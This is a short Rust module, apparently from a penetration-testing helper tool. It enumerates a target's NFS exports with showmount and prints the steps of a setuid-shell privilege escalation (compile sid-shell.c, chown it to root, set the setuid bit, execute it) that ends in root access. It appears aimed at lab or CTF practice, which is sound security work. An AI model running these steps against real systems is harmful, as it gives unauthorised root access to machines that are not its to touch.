use std::process::Command;

pub fn show_nfs_shares() {
    let target = crate::global::input_helper::prompt_user("Enter the target IP for NFS enumeration (e.g., 192.168.110.102):");

    let output = Command::new("showmount")
        .arg("-e")
        .arg(target)
        .output()
        .expect("Failed to execute showmount");

    println!("{}", String::from_utf8_lossy(&output.stdout));
}

pub fn sid_shell_escalation() {
    // Simulate the sid-shell escalation
    println!("You should compile the sid-shell.c file and upload it to the NFS share.");

    let commands = [
        "gcc -o sid-shell sid-shell.c",
        "chown root:root sid-shell",
        "chmod +s sid-shell",
        "./sid-shell"
    ];

    for command in &commands {
        println!("Execute the following: {}", command);
    }

    println!("Once the shell is uploaded and executed, you should have root access.");
}
